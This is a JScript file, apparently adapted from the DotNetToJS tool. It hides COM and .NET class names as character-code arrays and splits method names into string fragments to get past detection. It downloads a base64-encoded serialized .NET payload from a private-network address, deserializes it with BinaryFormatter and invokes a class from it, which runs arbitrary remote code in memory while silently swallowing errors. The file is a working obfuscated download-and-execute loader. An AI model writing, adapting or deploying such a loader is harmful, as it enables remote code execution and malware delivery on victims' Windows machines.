// Simple modified version of the DotNetToJS generated script

var str_dict = {}; 
// WScript.Shell
str_dict["wsc_sh"] = [87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101, 108, 108]; 
//COMPLUS_Version
str_dict["vers"] = [67, 79, 77, 80, 76, 85, 83, 95, 86, 101, 114, 115, 105, 111, 110];
// Microsoft.XMLHTTP
str_dict["dld"] = [77, 105, 99, 114, 111, 115, 111, 102, 116, 46, 88, 77, 76, 72, 84, 84, 80];
// System.Text.ASCIIEncoding
str_dict["asc"] = [83, 121, 115, 116, 101, 109, 46, 84, 101, 120, 116, 46, 65, 83, 67, 73, 73, 69, 110, 99, 111, 100, 105, 110, 103];
// System.Security.Cryptography.FromBase64Transform
str_dict["b64t"] = [83, 121, 115, 116, 101, 109, 46, 83, 101, 99, 117, 114, 105, 116, 121, 46, 67, 114, 121, 112, 116, 111, 103, 114, 97, 112, 104, 121, 46, 70, 114, 111, 109, 66, 97, 115, 101, 54, 52, 84, 114, 97, 110, 115, 102, 111, 114, 109];
// System.IO.MemoryStream
str_dict["str"] = [83, 121, 115, 116, 101, 109, 46, 73, 79, 46, 77, 101, 109, 111, 114, 121, 83, 116, 114, 101, 97, 109];
// System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
str_dict["fmtr"] = [83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 46, 70, 111, 114, 109, 97, 116, 116, 101, 114, 115, 46, 66, 105, 110, 97, 114, 121, 46, 66, 105, 110, 97, 114, 121, 70, 111, 114, 109, 97, 116, 116, 101, 114];
// System.Collections.ArrayList
str_dict["lst"] = [83, 121, 115, 116, 101, 109, 46, 67, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 65, 114, 114, 97, 121, 76, 105, 115, 116];



function Convert(codes) {
    var result = "";
    for (var i = 0; i < codes.length; i++) {
        result += String.fromCharCode(codes[i]);
    }
    return result;
}


function setVersion() {
    new ActiveXObject(Convert(str_dict["wsc_sh"])).Environment('Process')(Convert(str_dict["vers"])) = 'v' + [] + '4.0' + [] + '.303' + '19';
}

var entry_class = "TestClass";

function getter(url) {
    var cl = new ActiveXObject(Convert(str_dict["dld"]));
    cl['open']("GET", url, false);
    cl['send']();

    if (cl['status'] == 200) {
        var cnt = cl['res' + [] + 'ponseT' + 'ext'];
        return cnt;
    }
}

function decoder(b) {
    var enc = new ActiveXObject(Convert(str_dict["asc"]));
    var leng = enc['Get' + [''] + 'Byt' + 'e' + [] + 'Count' + [] + '_2'](b);
    var bts = enc['G' + [] + 'et' + 'B' + 'ytes' + '_4'](b);
    var tsf = new ActiveXObject(Convert(str_dict["b64t"]));     
    bts = tsf['Tr' + [] + 'ansfo' + [''] + 'rmFin' + 'alBl' + 'ock'](bts, 0, leng);
    var mstr = new ActiveXObject(Convert(str_dict["str"]));
    mstr['Wri' + 'te'](bts, 0, (leng / 4) * 3);
    mstr['Pos' + [] + 'ition'] = 0;
    return mstr;
}

try {
    setVersion();
    var srz = getter("http://192.168.45.216/loader_b64");
    var mstr = decoder(srz);
    var fmt = new ActiveXObject(Convert(str_dict["fmtr"]));
    var arr_list = new ActiveXObject(Convert(str_dict["lst"]));
    var dess = fmt['Des' + [] + 'eri' + [] + 'alize_' + '2'](mstr);
    arr_list['Add'](undefined);
    var out = dess['Dy' + 'na' + 'micI' + [] + 'nvoke'](arr_list.ToArray())['Cre' + 'ate' + 'In' + [] + 'sta' + 'nce'](entry_class);

} catch (e) {
}                                        